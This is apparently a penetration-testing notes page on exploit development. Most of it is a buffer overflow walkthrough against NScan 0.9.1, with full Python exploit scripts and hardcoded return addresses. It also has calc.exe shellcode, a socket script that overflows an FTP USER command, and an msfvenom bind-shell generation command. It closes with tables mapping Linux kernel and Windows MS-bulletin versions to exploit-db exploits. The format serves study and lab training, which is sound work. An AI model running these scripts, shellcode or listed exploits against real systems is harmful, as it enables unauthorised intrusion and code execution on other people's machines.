# Exploit

Exploit are divided by

* client side exploits
* remote exploits \(server side exploits\)
* local privilege escalation exploits

## Exploit Development - Buffer Overflow

## Windows Exploit

### Fuzzing

Fuzz the field with long string to see how many characters are required to crash the program

```python
python -c “print ‘A’*1100”
```

Attach the program to immunity debugger

### Find the EIP offset

Place the “mona.py” file inside the PyCommands folder in the Immunity directory \(`C:⧵Program Files⧵Immunity Inc⧵Immunity Debugger⧵PyCommands`\)

Type command

```text
!mona config -set workingfolder c:⧵logs⧵%p
```

Generate pattern \(same as metasploit pattern\_create.rb\)

```text
!mona pattern_create 1100
```

Check the EIP register and you'll see 0x68423268 Use Mona again to find the exact part of the buffer where we can overwrite EIP by

```text
!mona pattern_offset 0x68423268
```

Output returns

```text
Pattern h2Bh (0x68423268) found in cyclic pattern at position 997
```

Mona also provides more information about the overflowed buffer

```text
!mona findmsp
```

Develop POC script to test out the offset

```text
nscan_poc.py #1 Stack Diagram
 997 bytes 4 bytes
 +------------------------------+------------------+--------------------+
 |                              |                  |                    |
 | junk (AAAAAA...)             | eip (0x42424242) | fill (CCCCCC...)   |
 |                              |                  |                    |
 +------------------------------+------------------+--------------------+
 BUF_SIZE = 1100 bytes
```

```python
exploit = junk + eip                           # Combine junk + eip into exploit buffer
fill = "\x43"*(BUF_SIZE-len(exploit))          # Calculate number of filler bytes to us
buf = exploit + fill                           # Combine everything together for exploi
try:
  f = open("c:\\nscan_poc.txt", "wb")          # Exploit output will be written to C di
  f.write(buf)                                 # Write entirety of buffer out to file
  f.close()                                    # Close file
  print "\nNScan 0.9.1 Saved Return Pointer Overwrite Exploit"
  print "\nExploit written successfully!"
  print "Buffer size: " + str(len(buf)) + "\n" # Buffer size sanity check to e
except Exception, e:
  print "\nError! Exploit could not be generated, error details follow:\n"
  print str(e) + "\n"
```

### Loading EIP with our own address and mock code

```text
ESP (0x00d3ff18) points at offset 1001 in normal pattern (length 99)
```

We can see from the !mona findmsp output previously that it contains our generated pattern and has 99 bytes of space for our code

Use Mona again to find a suitable assembly instruction to jump into ESP and execute code from the stack

```text
!mona jmp -r esp
```

```text
!mona find -s "\xff\xe4"
```

Go back into the dig folder where you’ll find a file named “jmp”

We would like to choose an instruction that comes from an application module because this will allow our exploit to be more portable. But, since this isn’t the case here, we’ll settle for a Windows module that is usually present on Windows installations called kernel32.dll.

```text
nscan_poc.py #2 Stack Diagram

                                          +----------+
       997 bytes                 4 bytes  |          v
+------------------------------+----------+-------+--------------------------+------------------+
|                              |                  |                          |                  |
| junk (AAAAAA...)             | eip (0x7C836A78) | shellcode (INT 0xCC...)  | fill (CCCCCC...) |
|                              |                  |                          |                  |
+------------------------------+------------------+--------------------------+------------------+
                         BUF_SIZE = 1100 bytes
```

```python
import struct

BUF_SIZE = 1100                         # Set a consistent total buffer size

junk = "\x41"*997                       # 997 bytes to hit EIP
eip = struct.pack("<L", 0x7c836a78)     # Use little-endian to format address 0x7c836a78 # call esp # kernel32.dll
shellcode = "\xCC"*45                   # 45 bytes of mock interrupt (INT) code

exploit = junk + eip + shellcode        # Combine our eip with jump to stack including mock code
fill = "\x43"*(BUF_SIZE-len(exploit))   # Calculate number of filler bytes to use (C)
buf = exploit + fill                    # Combine everything together for exploitation

try:
    f = open("c:\\nscan_poc.txt", "wb") # Exploit output will be written to C directory
    f.write(buf)                        # Write entirety of buffer out to file
    f.close()                           # Close file
    print "\nNScan 0.9.1 Saved Return Pointer Overwrite Exploit"
    print "\nExploit written successfully!"
    print "Buffer size: " + str(len(buf)) + "\n" # Buffer size sanity check to ensure there's nothing funny going on
except Exception, e:
    print "\nError! Exploit could not be generated, error details follow:\n"
    print str(e) + "\n"
```

### Shellcode and popping calc.exe

```text
nscan_poc.py #3 Stack Diagram

                                          +----------+            +-------------+
       997 bytes                 4 bytes  |          v   16 bytes |             v
+------------------------------+----------+-------+---------------+-----------+------------------------------------+------------------+
|                              |                  |                           |                                    |                  |
| junk (AAAAAA...)             | eip (0x7C836A78) |  NOP sled (0x90 0x90 ...) | shellcode (calc.exe 0x31 0xC9 ...) | fill (CCCCCC...) |
|                              |                  |                           |                                    |                  |
+------------------------------+------------------+---------------------------+------------------------------------+------------------+
                         BUF_SIZE = 1100 bytes
```

```python
import struct

BUF_SIZE = 1100                         # Set a consistent total buffer size

junk = "\x41"*997                       # 997 bytes to hit EIP
eip = struct.pack("<L", 0x7c836a78)     # Use little-endian to format address 0x7c836a78 # call esp # kernel32.dll
nops = "\x90"*16                        # 16 byte NOP sled to get into our shellcode

# calc.exe shellcode for WinXP SP3 on stack
shellcode = "\x31\xC9"                  # xor ecx,ecx
shellcode += "\x51"                     # push ecx
shellcode += "\x68\x63\x61\x6C\x63"     # push 0x636c6163
shellcode += "\x54"                     # push dword ptr esp
shellcode += "\xB8\xC7\x93\xC2\x77"     # mov eax,0x77c293c7
shellcode += "\xFF\xD0"                 # call eax

exploit = junk + eip + nops + shellcode # Combine our exploit with a NOP sled and working shellcode
fill = "\x43"*(BUF_SIZE-len(exploit))   # Calculate number of filler bytes to use (C)
buf = exploit + fill                    # Combine everything together for exploitation

try:
    f = open("c:\\nscan_poc.txt", "wb") # Exploit output will be written to C directory
    f.write(buf)                        # Write entirety of buffer out to file
    f.close()                           # Close file
    print "\nNScan 0.9.1 Saved Return Pointer Overwrite Exploit"
    print "\nExploit written successfully!"
    print "Buffer size: " + str(len(buf)) + "\n" # Buffer size sanity check to ensure there's nothing funny going on
except Exception, e:
    print "\nError! Exploit could not be generated, error details follow:\n"
    print str(e) + "\n"
```

### Test for bad characters

```text
badchar = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
```

```python
# Testing for Bad Characters
# Written for NetSec.ws

import sys, socket, time

# Use in the form "python fuzzer.py  "

host = sys.argv[1] # Recieve IP from user
port = int(sys.argv[2]) # Recieve Port from user

#badchar '0x00'

badchar = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

# Return Address 0x7C9D30D7 in SHELL32.dll (Win XP SP3)
ret = '\xD7\x30\x9D\x7C' # Packed in little endian

# EIP Writing Pattern
pattern = "A"*2004 + ret + badchar # Our 'exploit' and return address with potential bad characters
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Declare a TCP socket
client.connect((host, port)) # Connect to user supplied port and IP address
client.recv(1024) # Recieve FTP Banner
client.send("USER " + pattern) # Send the user command with a variable length name
client.close() # Close the Connection
```

msfvenom to generate shellcode

```text
root@kali:~# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f python
```

## Linux Exploit

### Basic C and Linux for Exploit Development

Check the error code of the program we just run
```
$echo $?
```

Escape character for environment variable `\`

```
[program] \$USER
```
print $USER

```
[program] $USER
```
print your username

Check C function:
```
man [function]
```

### Command to search exploit in Kali Linux

> searchsploit \[software\]

### Linux Exploit Suggester

Check linux version:

> uname -a

Go to /usr/share/linux-exploit-suggester and run:

> ./Linux\_Exploit\_Suggester.pl -k 3.0.0

### Linux Exploit Table

| Linux Version | Vul Name | Exploit-DB |
| :--- | :--- | :--- |
| Kernel 2.26.x | Udev 1.4.1 | [https://www.exploit-db.com/exploits/8478/](https://www.exploit-db.com/exploits/8478/) |
| Kernel 2.26.22 - 3.9 | Dirtycow | [https://www.exploit-db.com/exploits/40839/](https://www.exploit-db.com/exploits/40839/) |
| Kernel 3.13.0-32 | Overlayfs | [https://www.exploit-db.com/exploits/37292/](https://www.exploit-db.com/exploits/37292/) |
| Samba 2.2.\* | Remote buffer overflow | [https://www.exploit-db.com/exploits/7/](https://www.exploit-db.com/exploits/7/) |
| Kernel 2.6.39-3.2.2 or Ubuntu 11.10 | Mempodipper | [https://www.exploit-db.com/exploits/35161/](https://www.exploit-db.com/exploits/35161/) |
| Kernel 2.6.37 ubuntu 10.04 | Full-nelson | [https://www.exploit-db.com/exploits/15704/](https://www.exploit-db.com/exploits/15704/) |
| Kernel under 2.6.32.2 Ubuntu 10.04 | Half-nelson | [https://www.exploit-db.com/exploits/17787/](https://www.exploit-db.com/exploits/17787/) |
| FreeBSD 9.0/9.1 | mmap/ptrace | [https://www.exploit-db.com/exploits/26368/](https://www.exploit-db.com/exploits/26368/) |
| Kernel 2.4.x/2.6.x | compile as: gcc -Wall -o 9545 9545.c -Wl,--hash-style=both | [https://www.exploit-db.com/exploits/9545/](https://www.exploit-db.com/exploits/9545/) |

## Windows Exploit

| Exploit-DB | Vul Name | MS\# | 2000 | XP | 2003 | 2008 | Vista | 7 |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| 100 | RPC DCOM Long File | MS03-026 | SP3/4 | - | - | - | - | - |
| 103 | RPC2 | MS03-039 | all \(CN\) | - | - | - | - | - |
| 109 | RPC2 | MS03-039 | all | - | - | - | - | - |
| 119 | Netapi | MS03-049 | SP4 | - | - | - | - | - |
| 3022 | ASN.1 | MS04-007 | SP2/3/4 | SP0/1 | - | - | - | - |
| 275 | SSL BOF | MS04-011 | SP4 | ? | - | - | - | - |
| 295 | Lsasarv.dll | MS04-011 | SP2/3/4 | SP0/1 | - | - | - | - |
| 734 | NetDDE BOF | MS04-031 | SP2/3/4 | SP0/1 | - | - | - | - |
| 1075 | Messaging Queue | MS05-017 | SP3/4 | SP0/1 | - | - | - | - |
| 1149 | PnP Service | MS05-039 | SP4 | - | - | - | - | - |
| 2223 | Canonicalize Pathname | MS06-040 | - | SP1 | - | - | - | - |
| 2265 | NetIPSRemote | MS06-040 | SP0-4 | SP0/1 | - | - | - | - |
| 2789 | NetPManageIPCConn | MS06-070 | SP4 | - | - | - | - | - |
| 7104 | Service Code Exec | MS08-067 | SP4 | SP2/3 | SP1/2 | SP0 | SP0/1 | - |
| 7132 | Service Code Exec | MS08-067 | SP4 | - | SP2 | - | - | - |
| 14674 | SRV2.SYS SMB | MS09-050 | - | - | - | - | SP1/2 | - |
| 14607 | Trans2Zero | MS10-054 |  |  |  |  |  |  |

### Buffer Overflow

{% embed url="http://www.primalsecurity.net/0x0-exploit-tutorial-buffer-overflow-vanilla-eip-overwrite-2/" caption="" %}

### Exploit Modification

{% embed url="http://www.dafthack.com/basic-exploit-mod-part-1" caption="" %}

{% embed url="http://www.dafthack.com/basic-exploit-mod-part-2" caption="" %}

### From Metasploit to Standalone Exploit

{% embed url="https://netsec.ws/?p=262" caption="" %}

